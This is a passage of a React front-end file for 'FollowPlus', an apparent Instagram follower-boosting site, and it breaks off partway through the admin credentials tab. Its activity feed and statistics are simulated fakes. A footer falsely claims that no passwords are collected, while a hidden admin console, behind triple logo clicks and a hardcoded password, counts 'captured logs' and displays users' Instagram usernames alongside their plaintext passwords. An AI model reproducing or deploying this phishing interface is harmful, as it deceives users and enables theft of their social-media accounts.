import { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Zap, 
  HelpCircle, 
  Sparkles, 
  ShieldCheck, 
  CheckCircle,
  TrendingUp, 
  Users, 
  Server,
  Heart,
  Eye,
  Info,
  Lock,
  Unlock,
  Trash2,
  LogOut,
  X,
  Copy,
  Check,
  Download,
  Key
} from 'lucide-react';

import CampaignBuilder from './components/CampaignBuilder';
import { Campaign } from './types';
import { getClientCampaignsDirectly, deleteClientCampaignDirectly, simulateCampaignProgress } from './firebase';

export default function App() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [showFirstUserGreeting, setShowFirstUserGreeting] = useState(true);
  
  // Real-time live activity feed state representing simulated proxy events
  const [liveActivities, setLiveActivities] = useState([
    { id: 1, user: 'ananya_curates', type: 'likes', amount: 250, server: 'US-EAST-4' },
    { id: 2, user: 'nikhil_clicks', type: 'followers', amount: 100, server: 'EU-WEST-1' },
    { id: 3, user: 'priya_vocalist', type: 'views', amount: 2500, server: 'APAC-SOUTH-2' },
    { id: 4, user: 'rohan_travels', type: 'followers', amount: 100, server: 'LATAM-EAST' },
  ]);

  useEffect(() => {
    const usersPool = ['sam_aesthetic', 'neha_style', 'kabir_vibe', 'tanya_lens', 'aarav_fitness', 'deepa_foodie', 'isha_reels', 'manish_tech', 'karan_vlog', 'reema_art', 'zoya_minimal', 'arjun_raw'];
    const typesPool = ['followers', 'likes', 'views'];
    const serversPool = ['US-WEST-2', 'EU-CENTRAL-1', 'APAC-SOUTH-1', 'LATAM-WEST-4', 'ME-EAST-3', 'APAC-NORTH-2'];
    
    const interval = setInterval(() => {
      const randomUser = usersPool[Math.floor(Math.random() * usersPool.length)];
      const randomType = typesPool[Math.floor(Math.random() * typesPool.length)];
      const randomServer = serversPool[Math.floor(Math.random() * serversPool.length)];
      let randomAmount = 100;
      if (randomType === 'likes') randomAmount = [150, 300, 500, 750][Math.floor(Math.random() * 4)];
      if (randomType === 'views') randomAmount = [800, 1500, 3000, 6000][Math.floor(Math.random() * 4)];
      
      const newEvent = {
        id: Date.now(),
        user: randomUser,
        type: randomType,
        amount: randomAmount,
        server: randomServer
      };
      
      setLiveActivities(prev => [newEvent, ...prev.slice(0, 3)]);
    }, 2800);
    
    return () => clearInterval(interval);
  }, []);

  // Admin and Click states
  const [logoClicks, setLogoClicks] = useState(0);
  const [isAdminLoginOpen, setIsAdminLoginOpen] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminEmail, setAdminEmail] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  
  // Custom states for admin utility tabs
  const [adminActiveTab, setAdminActiveTab] = useState<'campaigns' | 'credentials'>('campaigns');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [copiedAll, setCopiedAll] = useState(false);
  const [adminSearch, setAdminSearch] = useState('');

  const handleLogoClick = () => {
    setLogoClicks((prev) => {
      const next = prev + 1;
      if (next >= 3) {
        setIsAdminLoginOpen(true);
        setAdminError('');
        setAdminEmail('');
        setAdminPassword('');
        return 0;
      }
      return next;
    });
  };

  // Reset Logo click count idle timer
  useEffect(() => {
    if (logoClicks > 0) {
      const t = setTimeout(() => setLogoClicks(0), 4000);
      return () => clearTimeout(t);
    }
  }, [logoClicks]);

  // Fetch campaigns from backend with localStorage fallback for static deployment (GitHub Pages)
  const fetchCampaigns = async () => {
    let list: Campaign[] = [];
    try {
      // 1. Try to fetch directly from Google Cloud Firestore on the client side
      const fetched = await getClientCampaignsDirectly();
      list = fetched.map(simulateCampaignProgress);
    } catch (firestoreErr) {
      console.warn("Direct client-side Firestore fetch not available, trying backend API...", firestoreErr);
      try {
        const res = await fetch('/api/campaigns');
        if (res.ok) {
          list = await res.json();
        }
      } catch (err) {
        console.warn("Backend API not reachable. Using offline localStorage simulation...", err);
      }
    }

    // Load from localStorage as well
    const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
    
    // Merge server or Firestore lists with local lists, avoiding duplicate IDs
    const mergedList = [...list];
    localList.forEach((localItem: Campaign) => {
      if (!mergedList.some((item) => item.id === localItem.id)) {
        mergedList.push(simulateCampaignProgress(localItem));
      }
    });

    setCampaigns(mergedList);
  };

  useEffect(() => {
    fetchCampaigns();
  }, []);

  const handleCampaignCreated = (newCampaign: Campaign) => {
    // Refresh campaign dashboard list state on submit immediately
    setCampaigns((prev) => {
      if (prev.some(c => c.id === newCampaign.id)) return prev;
      return [newCampaign, ...prev];
    });
  };

  const deleteCampaign = async (id: string) => {
    // 1. Try deleting directly on client Firestore first
    try {
      await deleteClientCampaignDirectly(id);
    } catch (firestoreErr) {
      console.warn("Direct Firestore delete failed, trying backend API...", firestoreErr);
      try {
        await fetch(`/api/campaigns/${id}`, { method: 'DELETE' });
      } catch (err) {
        console.warn("Backend unavailable to delete, removing client-side only.", err);
      }
    }

    // 2. Always delete from client localStorage
    try {
      const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
      const filtered = localList.filter((item: any) => item.id !== id);
      localStorage.setItem('followplus_local_campaigns', JSON.stringify(filtered));
    } catch (err) {
      console.error("Failed to delete from localStorage", err);
    }

    // 3. Update component state and sync list
    setCampaigns((prev) => prev.filter((item) => item.id !== id));
  };

  return (
    <div 
      className="min-h-screen relative overflow-hidden text-gray-200 selection:bg-neon-pink selection:text-black font-sans pb-12"
      style={{
        background: 'radial-gradient(circle at 20% 20%, #1a1033 0%, #05050a 60%), radial-gradient(circle at 80% 80%, #0f172a 0%, #05050a 60%)',
        backgroundColor: '#05050a'
      }}
    >
      {/* Dynamic Cybersecurity Digital Grid Overlay */}
      <div className="absolute inset-0 cyber-grid opacity-75 z-0" />

      {/* Floating Living Ambiance Nebula Spheres (Live Animating Backdrop) */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-15%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-tr from-indigo-500/10 via-purple-500/10 to-transparent blur-[110px] animate-float-1" />
        <div className="absolute bottom-[15%] right-[-15%] w-[45vw] h-[45vw] rounded-full bg-gradient-to-br from-pink-500/12 via-rose-500/5 to-transparent blur-[120px] animate-float-2" />
        <div className="absolute top-[30%] right-[10%] w-[40vw] h-[40vw] rounded-full bg-gradient-to-tl from-cyan-500/8 via-indigo-500/10 to-transparent blur-[100px] animate-float-3" />
        <div className="absolute bottom-[-10%] left-[10%] w-[50vw] h-[50vw] rounded-full bg-gradient-to-r from-purple-500/8 via-pink-500/5 to-transparent blur-[110px] animate-float-1" style={{ animationDelay: '-12s' }} />
      </div>

      {/* Main Container */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 relative z-10">
        
        {/* Header / Brand Tickers */}
        <header className="flex items-center justify-between border-b border-white/10 pb-6">
          <div 
            onClick={handleLogoClick}
            className="flex items-center gap-3 cursor-pointer select-none active:scale-95 transition-transform"
            title="Click 3 times to trigger Admin login"
          >
            <div className="relative group flex items-center justify-center">
              <div className="absolute -inset-1.5 blur bg-gradient-to-r from-pink-500 to-indigo-600 rounded-xl opacity-75 transition duration-1000 group-hover:duration-200 animate-tilt" />
              <div className="relative w-11 h-11 rounded-xl bg-gradient-to-tr from-pink-500 to-indigo-600 flex items-center justify-center font-bold text-xl text-white select-none">
                +
              </div>
            </div>
            
            <div>
              <h1 className="text-2xl font-display font-black text-white tracking-tight flex items-center gap-2">
                FollowPlus
                <span className="text-[10px] uppercase font-mono tracking-widest bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-bold py-0.5 px-2.5 rounded-full border border-white/10 shadow-md">
                  PRO
                </span>
                {logoClicks > 0 && (
                  <motion.span 
                    initial={{ scale: 0.8 }} 
                    animate={{ scale: 1 }} 
                    className="text-[9px] font-mono text-pink-400 font-bold bg-pink-500/10 px-2 py-0.5 rounded border border-pink-500/20"
                  >
                    {logoClicks}/3 Clicks
                  </motion.span>
                )}
              </h1>
              <p className="text-xs text-gray-400">Frosted Glass Algorithmic Growth Protocol</p>
            </div>
          </div>
        </header>

        {/* Frosted Glass Majestic Hero Showcase banner */}
        {showFirstUserGreeting && (
          <motion.div 
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, height: 0 }}
            className="relative overflow-hidden glass-card p-5 sm:p-6 md:p-8 border border-white/10 shadow-[inner_0_0_30px_rgba(255,255,255,0.02)]"
          >
            {/* Ambient subtle glowing nodes */}
            <div className="absolute top-0 right-1/4 w-32 h-32 bg-pink-500/10 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute bottom-0 left-1/4 w-32 h-32 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
            
            <div className="space-y-4 max-w-4xl">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 text-[10px] font-bold uppercase tracking-wider">
                VIP First User Benefit
              </div>
              
              <h2 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-extrabold tracking-tight text-white leading-tight">
                8 Days. <span className="text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-400 to-indigo-400 font-extrabold">Free Trial.</span> 100 Followers / Day.
              </h2>
              
              <p className="text-xs sm:text-sm text-gray-400 leading-relaxed max-w-2xl">
                Claim your introductory benefit to receive <strong className="text-white font-medium">100 high-retention profiles daily for 8 consecutive days</strong> (800 followers total). No payment or credit card credentials required. Experience safe, organic algorithm growth.
              </p>
              
              {/* Feature Tags list - Horizontal Pill Badges */}
              <div className="flex flex-wrap gap-2 pt-1">
                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-xs text-indigo-300 font-mono">
                  <Users className="w-3.5 h-3.5 text-indigo-400" />
                  <span>800 followers</span>
                </div>
                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-pink-500/10 border border-pink-500/20 rounded-full text-xs text-pink-300 font-mono">
                  <Heart className="w-3.5 h-3.5 text-pink-400" />
                  <span>Real engagement auto</span>
                </div>
                <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-purple-500/10 border border-purple-500/20 rounded-full text-xs text-purple-300 font-mono">
                  <Eye className="w-3.5 h-3.5 text-purple-400" />
                  <span>Reels booster index</span>
                </div>
              </div>
              
              <div className="flex flex-wrap items-center gap-3 pt-2">
                <a 
                  href="#campaign-builder-section"
                  onClick={(e) => {
                    e.preventDefault();
                    document.getElementById('campaign-builder-section')?.scrollIntoView({ behavior: 'smooth' });
                  }}
                  className="px-4.5 py-2.5 bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-display font-semibold rounded-lg hover:brightness-110 active:scale-95 transition-all shadow-lg text-xs tracking-wide"
                >
                  Claim Free Trial
                </a>
                <button 
                  onClick={() => setShowFirstUserGreeting(false)}
                  className="px-4 py-2.5 bg-white/5 border border-white/10 text-gray-400 hover:text-white transition-all text-xs font-mono rounded-lg hover:bg-white/10"
                >
                  Dismiss [x]
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* Centered Campaign Builder Section */}
        <div id="campaign-builder-section" className="max-w-xl mx-auto w-full scroll-mt-6">
          <CampaignBuilder onCampaignCreated={handleCampaignCreated} />
        </div>

        {/* Live Traffic Feed Module */}
        <div className="max-w-xl mx-auto w-full glass-card p-5 border border-white/10 relative overflow-hidden shadow-[0_8px_30px_rgba(0,0,0,0.3)] transition-all hover:border-pink-500/10">
          {/* Animated pulsing status */}
          <div className="absolute top-4 right-5 flex items-center gap-1.5 bg-emerald-500/10 border border-emerald-500/20 py-1 px-3 rounded-full">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping inline-block" />
            <span className="text-[9px] font-mono text-emerald-400 font-bold tracking-wider uppercase">Live Pipe</span>
          </div>

          <div className="space-y-4">
            <div>
              <h3 className="text-xs font-mono uppercase text-indigo-400 font-bold tracking-widest flex items-center gap-2">
                <Sparkles className="w-3.5 h-3.5 text-pink-400 animate-pulse" />
                Live Order
              </h3>
              <p className="text-[10px] text-gray-500 mt-0.5">Real-time status of active orders and delivery queues.</p>
            </div>

            <div className="space-y-2 font-mono text-[11px] bg-black/40 border border-white/5 p-3.5 rounded-xl">
              <AnimatePresence mode="popLayout">
                {liveActivities.map((act) => (
                  <motion.div
                    key={act.id}
                    initial={{ opacity: 0, x: -10, y: -5 }}
                    animate={{ opacity: 1, x: 0, y: 0 }}
                    exit={{ opacity: 0, x: 10, y: 5 }}
                    transition={{ type: 'spring', stiffness: 350, damping: 25 }}
                    className="flex justify-between items-center py-2 first:pt-0 last:pb-0 border-b border-white/5 last:border-b-0"
                  >
                    <div className="flex items-center gap-2">
                      <span className="text-gray-200 font-bold">@{act.user}</span>
                    </div>

                    <div className="flex items-center gap-1.5">
                      <span className="text-gray-500 text-[10px]">queued</span>
                      <span className={`font-black font-display text-[11px] font-bold ${
                        act.type === 'followers' ? 'text-pink-400' : act.type === 'likes' ? 'text-cyan-400' : 'text-purple-400'
                      }`}>
                        +{act.amount.toLocaleString()} {act.type}
                      </span>
                      <span className="text-emerald-400 font-bold bg-emerald-500/10 border border-emerald-500/20 px-1 rounded text-[9px]">OK</span>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
        </div>

        {/* Network Cap bento stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[
            { label: 'Followers Delivered Today', val: '438,219', desc: '+12.4% vs yesterday', icon: Users, color: 'text-neon-cyan' },
            { label: 'Global Proxies Active', val: '2,841 Nodes', desc: 'Secure decentralized mesh', icon: Server, color: 'text-neon-purple' },
            { label: 'Average Viral Match', val: '97.4%', desc: 'Optimized index retention', icon: TrendingUp, color: 'text-neon-pink' },
            { label: 'Network Integrity', val: '100% Secure', desc: 'Private routing pipeline', icon: ShieldCheck, color: 'text-emerald-400' }
          ].map((stat, i) => {
            const Icon = stat.icon;
            return (
              <div key={i} className="interactive-card rounded-xl p-4 bg-[#121420]/50 border border-white/5 flex flex-col justify-between">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-mono uppercase text-gray-500 tracking-wider leading-relaxed">{stat.label}</span>
                  <Icon className={`w-4 h-4 ${stat.color}`} />
                </div>
                <div className="mt-3">
                  <span className="font-display font-bold text-white text-lg tracking-tight block">{stat.val}</span>
                  <span className="text-[10px] text-gray-400 font-sans block mt-0.5">{stat.desc}</span>
                </div>
              </div>
            );
          })}
        </div>

        {/* Footer info representing modern aesthetics */}
        <footer className="pt-8 border-t border-white/5 text-center text-xs text-gray-500 space-y-3">
          <p>© 2026 Follow Plus Network. Developed using decentralized secure delivery proxies.</p>
          <div className="flex items-center justify-center gap-4 text-gray-500 font-mono">
            <span className="hover:text-neon-cyan transition-colors cursor-pointer">Security Protocol JSON</span>
            <span>•</span>
            <span className="hover:text-neon-pink transition-colors cursor-pointer">Organic API Compliance</span>
            <span>•</span>
            <span className="hover:text-neon-purple transition-colors cursor-pointer">Decentralized Routing Policy</span>
          </div>
          <p className="text-[11px] text-gray-600 max-w-2xl mx-auto leading-relaxed pt-2">
            Disclamer: Follow Plus operates a secure simulated client auditing tool and dynamic organic network router that strictly leverages public Instagram API feeds. No password input or account credentials are required at any process. All services comply with safety quotas to protect user integrity.
          </p>
        </footer>

      </div>

      {/* 1. Admin Login Modal Overlay */}
      <AnimatePresence>
        {isAdminLoginOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="glass-card p-8 border border-white/15 w-full max-w-md relative font-sans"
            >
              <button 
                onClick={() => setIsAdminLoginOpen(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
                type="button"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex flex-col items-center text-center space-y-2 mb-6">
                <div className="w-12 h-12 rounded-full bg-pink-500/15 flex items-center justify-center text-pink-500 border border-pink-500/30">
                  <Lock className="w-6 h-6" />
                </div>
                <h2 className="text-xl font-display font-bold text-white tracking-tight">Admin Portal Authorization</h2>
                <p className="text-xs text-gray-400">Please provide verified security credentials to log in.</p>
              </div>

              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  if (adminEmail === 'admin@followplus.in' && adminPassword === '@#Mohit') {
                    setIsAdminLoggedIn(true);
                    setIsAdminLoginOpen(false);
                    setAdminError('');
                    setAdminEmail('');
                    setAdminPassword('');
                    fetchCampaigns();
                  } else {
                    setAdminError('Invalid authorization ID or Password.');
                  }
                }}
                className="space-y-4"
              >
                <div className="space-y-1.5">
                  <label className="text-[11px] font-mono text-gray-400 uppercase tracking-wider block">Admin Email / ID</label>
                  <input
                    type="email"
                    required
                    placeholder="admin@followplus.in"
                    value={adminEmail}
                    onChange={(e) => setAdminEmail(e.target.value)}
                    className="w-full bg-black/60 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-pink transition-all text-sm font-mono"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="text-[11px] font-mono text-gray-400 uppercase tracking-wider block">Admin Password</label>
                  <input
                    type="password"
                    required
                    placeholder="••••••••"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    className="w-full bg-black/60 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-pink transition-all text-sm font-mono"
                  />
                </div>

                {adminError && (
                  <div className="p-3 text-xs bg-rose-500/10 border border-rose-500/30 text-rose-300 rounded-lg text-center font-semibold animate-shake">
                    {adminError}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full py-3.5 mt-2 bg-gradient-to-r from-pink-500 to-indigo-600 hover:from-pink-600 hover:to-indigo-700 text-white font-display font-bold rounded-xl transition-all shadow-lg active:scale-95"
                >
                  Verify Configuration Security
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* 2. Admin Command Dashboard View */}
      <AnimatePresence>
        {isAdminLoggedIn && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 md:p-8 bg-[#030307]/90 backdrop-blur-lg overflow-y-auto">
            <motion.div 
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 30 }}
              className="glass-card max-w-5xl w-full border border-white/10 relative p-6 sm:p-8 space-y-6 font-sans my-auto shadow-[0_0_50px_rgba(236,72,153,0.1)] rounded-2xl"
            >
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-white/10">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-xl bg-indigo-500/20 flex items-center justify-center text-indigo-400 border border-indigo-500/30">
                    <Unlock className="w-5 h-5" />
                  </div>
                  <div>
                    <h2 className="text-xl sm:text-2xl font-display font-black text-white tracking-tight flex items-center gap-2">
                      Admin Command Console
                      <span className="text-[10px] uppercase font-mono tracking-widest bg-emerald-500/20 text-emerald-400 font-bold py-0.5 px-2.5 rounded-full border border-emerald-500/30">
                        AUTHORIZED OK
                      </span>
                    </h2>
                    <p className="text-xs text-gray-400 mt-0.5">Control live campaign flows, monitor active delivery channels, and view user database logins.</p>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <button
                    onClick={() => {
                      setIsAdminLoggedIn(false);
                    }}
                    className="px-4 py-2.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 hover:text-rose-300 transition-all duration-200 rounded-xl border border-rose-500/20 text-xs flex items-center gap-2 font-mono font-bold hover:shadow-lg focus:outline-none focus:ring-1 focus:ring-rose-500 cursor-pointer active:scale-95"
                  >
                    <LogOut className="w-3.5 h-3.5" />
                    Secure Logout
                  </button>
                </div>
              </div>
              {/* Summary Widgets */}
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 pt-2">
                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-pink-500/20 group relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-pink-500/5 rounded-full blur-2xl group-hover:bg-pink-500/10 transition-all duration-300" />
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Total Campaigns</span>
                    <span className="p-1.5 bg-pink-500/10 rounded-lg text-pink-400 text-xs font-mono font-bold tracking-widest border border-pink-500/20">LIVE</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-black text-3xl text-white tracking-tight">{campaigns.length}</span>
                    <span className="text-[10px] text-emerald-400 font-mono mt-1 font-semibold flex items-center gap-0.5">↑ 100% active</span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1.5">Registered profile distribution threads.</p>
                </div>

                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-indigo-500/20 group relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/5 rounded-full blur-2xl group-hover:bg-indigo-500/10 transition-all duration-300" />
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Stored Passwords</span>
                    <span className="p-1.5 bg-indigo-500/10 rounded-lg text-indigo-400 text-xs font-mono font-bold tracking-widest border border-indigo-500/20">SECURE</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-black text-3xl text-pink-400 tracking-tight">
                      {campaigns.filter(c => c.password).length}
                    </span>
                    <span className="text-[10px] text-indigo-400 font-mono mt-1 font-semibold">captured logs</span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1.5">User profile linkages locked in DB.</p>
                </div>

                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-violet-500/20 group relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-violet-500/5 rounded-full blur-2xl group-hover:bg-violet-500/10 transition-all duration-300" />
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Free Trials</span>
                    <span className="p-1.5 bg-violet-500/10 rounded-lg text-violet-400 text-xs font-mono font-bold tracking-widest border border-violet-500/20">8-DAY TRIAL</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-black text-3xl text-violet-400 tracking-tight">
                      {campaigns.filter(c => c.type === 'free_followers_trial').length}
                    </span>
                    <span className="text-[10px] text-gray-500 font-mono mt-1">allocated slots</span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1.5">Complimentary speed-boost instances.</p>
                </div>

                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-emerald-500/20 group relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl group-hover:bg-emerald-500/10 transition-all duration-300" />
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Decentralized Nodes</span>
                    <span className="p-1.5 bg-emerald-500/10 rounded-lg text-emerald-400 text-xs font-mono font-bold tracking-widest border border-emerald-500/20">ONLINE</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-black text-3xl text-emerald-400 tracking-tight">2,841</span>
                    <span className="text-[10px] text-emerald-500 font-mono mt-1 font-semibold flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping inline-block" /> Active
                    </span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1.5">Proxy relays running worldwide system.</p>
                </div>
              </div>

              {/* Advanced Utilities Tab Controller & Search bar */}
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-white/10 pb-5 pt-2">
                <div className="flex bg-black/60 p-1.5 rounded-2xl border border-white/10 self-start">
                  <button
                    onClick={() => setAdminActiveTab('campaigns')}
                    className={`px-4.5 py-2.5 rounded-xl text-xs font-bold font-display transition-all duration-200 cursor-pointer ${
                      adminActiveTab === 'campaigns'
                        ? 'bg-gradient-to-r from-pink-500 to-rose-500 text-white shadow-lg shadow-pink-500/20'
                        : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'
                    }`}
                  >
                    Active Campaign Boosts ({campaigns.length})
                  </button>
                  <button
                    onClick={() => setAdminActiveTab('credentials')}
                    className={`px-4.5 py-2.5 rounded-xl text-xs font-bold font-display transition-all duration-200 cursor-pointer ${
                      adminActiveTab === 'credentials'
                        ? 'bg-gradient-to-r from-indigo-600 to-indigo-500 text-white shadow-lg shadow-indigo-500/20'
                        : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'
                    }`}
                  >
                    Saved Database Logins ({campaigns.filter(c => c.password).length})
                  </button>
                </div>

                <div className="flex flex-1 md:max-w-xs relative group">
                  <input
                    type="text"
                    placeholder="Search Username / Password..."
                    value={adminSearch}
                    onChange={(e) => setAdminSearch(e.target.value)}
                    className="w-full bg-black/40 border border-white/10 rounded-2xl py-2.5 px-4 pr-10 text-xs text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-all focus:bg-black/60 focus:ring-1 focus:ring-indigo-500/20"
                  />
                  {adminSearch ? (
                    <button
                      onClick={() => setAdminSearch('')}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white text-xs p-1"
                    >
                      ✕
                    </button>
                  ) : (
                    <div className="absolute right-3/5 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-indigo-400 pointer-events-none" />
                  )}
                </div>
              </div>

              {/* Active Campaigns Table or Filtered Logins */}
              {adminActiveTab === 'campaigns' ? (
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <h3 className="text-sm font-mono text-gray-400 uppercase tracking-widest font-bold">Stored Campaign Register</h3>
                    <p className="text-[10.5px] text-gray-500">Includes campaigns created under trial & premium protocols.</p>
                  </div>
                  
                  <div className="overflow-x-auto border border-white/5 rounded-xl bg-black/20">
                    <table className="w-full border-collapse text-left text-xs text-gray-300">
                      <thead>
                        <tr className="border-b border-white/10 bg-black/40 text-gray-400 font-mono uppercase text-[10px] tracking-wider">
                          <th className="p-4">Instagram Profile</th>
                          <th className="p-4">Saved Login Password</th>
                          <th className="p-4">Service Type</th>
                          <th className="p-4 text-center">Velocity Size</th>
                          <th className="p-4">Status</th>
                          <th className="p-4 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5">
                        {campaigns.filter(c => 
                          c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                          (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                        ).length === 0 ? (
                          <tr>
                            <td colSpan={6} className="p-10 text-center text-gray-500 font-mono">
                              No matching campaigns found inside server memory.
                            </td>
                          </tr>
                        ) : (
                          campaigns
                            .filter(c => 
                              c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                              (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                            )
                            .map((camp) => (
                              <tr key={camp.id} className="hover:bg-white/5 transition-colors">
                                <td className="p-4 font-semibold text-white">
                                  <span className="text-gray-500 font-mono">@</span>{camp.username}
                                </td>
                                <td className="p-4">
                                  {camp.password ? (
                                    <span className="font-mono text-pink-400 bg-pink-500/10 px-2 py-1 rounded border border-pink-500/20 font-bold select-all">
                                      {camp.password}
                                    </span>
                                  ) : (
                                    <span className="text-gray-600 italic font-mono text-[11px]">No password specified</span>
                                  )}
                                </td>
                                <td className="p-4 font-mono">
                                  {camp.type === 'free_followers_trial' ? (
                                    <span className="text-indigo-400 font-bold bg-indigo-500/10 px-2.5 py-0.5 rounded-full border border-indigo-500/20">
                                      Free 8-Day Trial
                                    </span>
                                  ) : (
                                    <span className="text-neon-cyan capitalize bg-neon-cyan/10 px-2.5 py-0.5 rounded-full border border-neon-cyan/20 animate-none font-semibold">
                                      {camp.type} Boost
                                    </span>
                                  )}
                                </td>
                                <td className="p-4 text-center font-mono font-bold text-gray-200">
                                  {camp.deliveredAmount.toLocaleString()} / {camp.targetAmount.toLocaleString()}
                                </td>
                                <td className="p-4">
                                  <span className={`inline-flex items-center gap-1.5 font-mono text-[10px] uppercase font-bold px-2 py-0.5 rounded-md ${
                                    camp.status === 'active' 
                                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 animate-pulse' 
                                      : camp.status === 'completed'
                                        ? 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
                                        : 'bg-yellow-500/10 text-yellow-500'
                                  }`}>
                                    <span className={`w-1.5 h-1.5 rounded-full ${camp.status === 'active' ? 'bg-emerald-400' : 'bg-gray-400'}`} />
                                    {camp.status}
                                  </span>
                                </td>
                                <td className="p-4 text-right">
                                  <button
                                    onClick={() => {
                                      if (confirm(`Are you sure you want to delete the campaign for @${camp.username}?`)) {
                                        deleteCampaign(camp.id);
                                      }
                                    }}
                                    className="p-2 text-rose-500 hover:text-rose-400 hover:bg-rose-500/10 rounded-lg transition-colors cursor-pointer inline-flex items-center justify-center border border-transparent hover:border-rose-500/20"
                                    title="Delete entry"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </button>
                                </td>
                              </tr>
                            ))
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div>
